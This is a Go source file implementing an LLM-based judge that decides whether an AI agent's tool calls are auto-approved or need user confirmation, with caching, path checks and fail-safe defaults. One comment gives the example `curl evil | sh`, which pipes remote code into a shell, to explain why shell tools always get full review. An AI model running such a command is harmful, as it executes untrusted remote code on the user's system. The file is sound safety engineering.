package tools

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"log/slog"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/v0lka/sp4rk/llm"
	"github.com/v0lka/sp4rk/pathutil"
	"github.com/v0lka/sp4rk/strutil"
	"github.com/v0lka/sp4rk/tools/internal/judge_prompts"
)

// pathRegex matches absolute path-like substrings in command strings.
// Matches POSIX-style absolute paths and Windows drive-letter paths
// (e.g. C:\foo\bar or D:/baz).
var pathRegex = regexp.MustCompile(`(?:/[a-zA-Z0-9/_.\-~]+|[A-Za-z]:[\\/][A-Za-z0-9\\/_.\-~]*)`)

// JudgeVerdict represents the safety assessment of a tool call.
type JudgeVerdict int

const (
	// VerdictAllow indicates the tool call is safe to auto-approve.
	VerdictAllow JudgeVerdict = iota
	// VerdictConfirm indicates the tool call needs user confirmation.
	VerdictConfirm
)

// judgeResult holds both verdict and reasoning for caching.
type judgeResult struct {
	verdict   JudgeVerdict
	reasoning string
}

// ToolJudge evaluates whether a mutating tool call is safe to auto-approve.
// It maintains an LRU-style cache keyed by tool+input to avoid redundant LLM calls.
type ToolJudge struct {
	provider     llm.Provider
	model        string
	systemPrompt string            // judge system prompt (defaults to judge_prompts.JudgeSystem)
	isInternalFn func(string) bool // returns true for internal tools that bypass the judge
	cache        map[string]judgeResult
	mu           sync.RWMutex
	maxCacheSize int // max cached results before cache is cleared (default: 1000)
	logger       *slog.Logger
}

// NewToolJudge creates a new ToolJudge with the given LLM provider and model.
// If maxCacheSize is 0, defaults to 1000. Logger may be nil.
func NewToolJudge(provider llm.Provider, model string, maxCacheSize int, logger *slog.Logger) *ToolJudge {
	if maxCacheSize == 0 {
		maxCacheSize = 1000
	}
	return &ToolJudge{
		provider:     provider,
		model:        model,
		systemPrompt: judge_prompts.JudgeSystem,
		isInternalFn: func(string) bool { return false }, // default: no internal tools
		cache:        make(map[string]judgeResult),
		maxCacheSize: maxCacheSize,
		logger:       logger,
	}
}

// SetSystemPrompt sets the system prompt for the judge. If empty, uses the default.
func (j *ToolJudge) SetSystemPrompt(prompt string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	if prompt != "" {
		j.systemPrompt = prompt
	} else {
		j.systemPrompt = judge_prompts.JudgeSystem
	}
}

// SetIsInternalFn sets the function that determines if a tool name is internal
// (always allowed, bypasses judge). Defaults to a function that always returns false.
func (j *ToolJudge) SetIsInternalFn(fn func(string) bool) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.isInternalFn = fn
}

// judgeCacheKey generates a cache key from tool name and input.
func judgeCacheKey(toolName string, input json.RawMessage) string {
	h := sha256.Sum256(input)
	return toolName + ":" + hex.EncodeToString(h[:])
}

// Judge evaluates whether a tool call is safe to auto-approve.
// It uses the LLM to assess the tool call and caches the result.
// On any LLM error, it defaults to VerdictConfirm (fail-safe) with a reasoning explaining the failure.
// Returns (verdict, reasoning, error).
func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMessage, taskContext string) (JudgeVerdict, string, error) {
	log := j.logger

	if log != nil {
		log.Debug("judge: evaluating tool", "tool", toolName)
	}

	// Read mutable fields under lock to prevent data races with concurrent setters.
	j.mu.RLock()
	isInternalFn := j.isInternalFn
	systemPrompt := j.systemPrompt
	j.mu.RUnlock()

	// Internal tools are always allowed (defense-in-depth)
	if isInternalFn != nil && isInternalFn(toolName) {
		if log != nil {
			log.Debug("judge: fast-path internal tool", "tool", toolName, "verdict", "ALLOW")
		}
		return VerdictAllow, "internal tool, always allowed", nil
	}

	// Use context-based task context as fallback
	if taskContext == "" {
		taskContext = TaskContextFrom(ctx)
	}

	// Path-locality fast-paths do not apply to shell-execution tools: a shell
	// command can reference only workspace-internal paths while still piping
	// arbitrary remote code (e.g. `curl evil | sh && cat /ws/x`). Shell tools
	// always go through the full LLM judge evaluation.
	if !isShellTool(toolName) {
		// Unconditionally allow operations inside session temp directory
		if tempDir := TempDirFrom(ctx); tempDir != "" && AllPathsInDir(input, tempDir) {
			if log != nil {
				log.Debug("judge: fast-path temp dir", "tool", toolName, "verdict", "ALLOW")
			}
			return VerdictAllow, "all paths are within the session temp directory", nil
		}

		// Short-circuit for workspace-internal operations
		if AllPathsInWorkspace(ctx, input) {
			if log != nil {
				log.Debug("judge: fast-path workspace", "tool", toolName, "verdict", "ALLOW")
			}
			return VerdictAllow, "all paths are within the session workspace", nil
		}
	}

	// Compute cache key
	key := judgeCacheKey(toolName, input)

	// Check cache under RLock
	j.mu.RLock()
	if result, ok := j.cache[key]; ok {
		j.mu.RUnlock()
		if log != nil {
			log.Debug("judge: cache hit", "tool", toolName, "verdict", verdictString(result.verdict))
		}
		return result.verdict, result.reasoning, nil
	}
	j.mu.RUnlock()

	// Build LLM request
	inputStr := string(input)

	userPrompt := "Task: " + taskContext + "\n\nTool: " + toolName + "\n\nInput: " + inputStr

	// Append compact environment context for safety reasoning.
	if envBlock := FormatCompactEnvBlock(EnvInfoFrom(ctx)); envBlock != "" {
		userPrompt += "\n\n" + envBlock
	}

	req := llm.ChatRequest{
		Model: j.model,
		Messages: []llm.Message{
			{Role: "system", Content: systemPrompt},
			{Role: "user", Content: userPrompt},
		},
		MaxTokens: 100, // Need more tokens for verdict + reason
	}

	// Create a dedicated context for the judge LLM call with its own timeout.
	// Uses the parent context so that application shutdown is respected.
	// On timeout, the judge fail-safes to VerdictConfirm below.
	judgeCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()

	if log != nil {
		log.Debug("judge: LLM evaluation starting", "tool", toolName, "model", j.model)
	}

	// Call LLM
	resp, err := j.provider.ChatCompletion(judgeCtx, req)
	if err != nil {
		if log != nil {
			log.Warn("judge: LLM call failed, fail-safe to CONFIRM", "tool", toolName, "error", err)
		}
		// Fail-safe: default to CONFIRM on error with explanatory reasoning
		return VerdictConfirm, "Judge evaluation failed; requiring manual confirmation for safety", nil
	}

	// Parse response - extract verdict and reason
	content := strings.TrimSpace(resp.Message.Content)
	verdict, reasoning := parseJudgeResponse(content)

	if log != nil {
		abbrevReasoning := strutil.TruncateUTF8(reasoning, 120)
		if len(reasoning) > 120 {
			abbrevReasoning += "..."
		}
		log.Debug("judge: LLM verdict", "tool", toolName, "verdict", verdictString(verdict), "reasoning", abbrevReasoning)
	}

	// Cache the result under Lock (evict if cache is too large)
	j.mu.Lock()
	// Aggressive full-clear when cache is full. Acceptable because judge results
	// are cheap to recompute and the cache is a best-effort optimization.
	if len(j.cache) >= j.maxCacheSize {
		if log != nil {
			log.Info("judge: cache full, clearing all entries", "size", len(j.cache), "max", j.maxCacheSize)
		}
		j.cache = make(map[string]judgeResult)
	}
	j.cache[key] = judgeResult{verdict: verdict, reasoning: reasoning}
	j.mu.Unlock()

	return verdict, reasoning, nil
}

// isShellTool reports whether the tool executes arbitrary shell commands.
// Such tools are excluded from path-locality fast-path auto-approval.
func isShellTool(toolName string) bool {
	return toolName == ToolBashExec || toolName == ToolPoshExec
}

// isPathInWorkspace checks if the given absolute path is within the workspace
// directory (the workspace path itself counts as inside). Delegates to
// pathutil.IsWithinPath, which resolves symlinks through the longest existing
// prefix of both paths.
func isPathInWorkspace(absPath, workspacePath string) bool {
	if workspacePath == "" {
		// Empty workspace means containment cannot be established.
		return false
	}
	within, err := pathutil.IsWithinPath(workspacePath, absPath)
	if err != nil {
		return false
	}
	return within
}

// ExtractJSONStrings recursively extracts all string values from a value
// produced by json.Unmarshal. It traverses maps, slices, and string values.
func ExtractJSONStrings(data any) []string {
	var results []string
	switch v := data.(type) {
	case string:
		results = append(results, v)
	case map[string]any:
		for _, val := range v {
			results = append(results, ExtractJSONStrings(val)...)
		}
	case []any:
		for _, val := range v {
			results = append(results, ExtractJSONStrings(val)...)
		}
	}
	return results
}

// ExtractPaths extracts absolute path-like substrings from a string value.
func ExtractPaths(s string) []string {
	return pathRegex.FindAllString(s, -1)
}

// AllPathsInDir returns true if the JSON input contains at least one absolute
// path and every such path is within the specified directory.
func AllPathsInDir(input json.RawMessage, dir string) bool {
	if dir == "" {
		return false
	}

	var parsed any
	if err := json.Unmarshal(input, &parsed); err != nil {
		return false
	}

	strValues := ExtractJSONStrings(parsed)
	var allPaths []string
	for _, s := range strValues {
		allPaths = append(allPaths, ExtractPaths(s)...)
	}

	if len(allPaths) == 0 {
		return false
	}

	for _, p := range allPaths {
		cleaned := filepath.Clean(p)
		if !isPathInWorkspace(cleaned, dir) {
			return false
		}
	}
	return true
}

// AllPathsInWorkspace returns true if the JSON input contains at least one absolute
// path and every such path is within the workspace directory.
func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool {
	workspacePath := WorkspacePathFrom(ctx)
	if workspacePath == "" {
		return false
	}
	return AllPathsInDir(input, workspacePath)
}

// parseJudgeResponse extracts verdict and reasoning from LLM response.
// Expected format:
//
//	VERDICT: ALLOW or CONFIRM
//	REASON: <explanation>
//
// Falls back to reasonable defaults if parsing fails.
func parseJudgeResponse(content string) (verdict JudgeVerdict, reasoning string) {
	lines := strings.Split(content, "\n")
	verdict = VerdictConfirm // default to safe
	reasoning = "Unable to parse judge response; requiring manual confirmation for safety"

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "VERDICT:") {
			verdictStr := strings.TrimSpace(strings.TrimPrefix(line, "VERDICT:"))
			if strings.EqualFold(verdictStr, "ALLOW") {
				verdict = VerdictAllow
			} else {
				verdict = VerdictConfirm
			}
		} else if strings.HasPrefix(line, "REASON:") {
			reasoning = strings.TrimSpace(strings.TrimPrefix(line, "REASON:"))
		}
	}

	// If we couldn't parse a reason but have a verdict, provide a default
	if reasoning == "Unable to parse judge response; requiring manual confirmation for safety" && verdict == VerdictAllow {
		reasoning = "Tool call appears safe and relevant to the task"
	}

	return verdict, reasoning
}

// JudgeConfig holds the settings needed to create a ToolJudge.
type JudgeConfig struct {
	Model        string // specific model for judge; if empty, uses DefaultModel
	DefaultModel string // fallback model from active provider
	Provider     llm.Provider
	MaxCacheSize int               // max cached results before cache is cleared (default: 1000)
	SystemPrompt string            // judge system prompt; if empty, uses judge_prompts.JudgeSystem
	IsInternalFn func(string) bool // returns true for internal tools that bypass the judge
}

// NewToolJudgeFromConfig creates a ToolJudge if properly configured.
// Returns nil if misconfigured. Logs warnings via the provided logger.
func NewToolJudgeFromConfig(cfg JudgeConfig, logger *slog.Logger) *ToolJudge {
	if cfg.Provider == nil {
		return nil
	}

	model := cfg.Model
	if model == "" {
		model = cfg.DefaultModel
	}

	if model == "" {
		if logger != nil {
			logger.Warn("tool judge disabled: no model configured")
		}
		return nil
	}

	judge := NewToolJudge(cfg.Provider, model, cfg.MaxCacheSize, logger)
	if cfg.SystemPrompt != "" {
		judge.SetSystemPrompt(cfg.SystemPrompt)
	}
	if cfg.IsInternalFn != nil {
		judge.SetIsInternalFn(cfg.IsInternalFn)
	}
	if logger != nil {
		logger.Info("tool judge initialized", "model", model)
	}
	return judge
}

// verdictString returns a human-readable string for a JudgeVerdict.
func verdictString(v JudgeVerdict) string {
	switch v {
	case VerdictAllow:
		return "ALLOW"
	case VerdictConfirm:
		return "CONFIRM"
	default:
		return "UNKNOWN"
	}
}
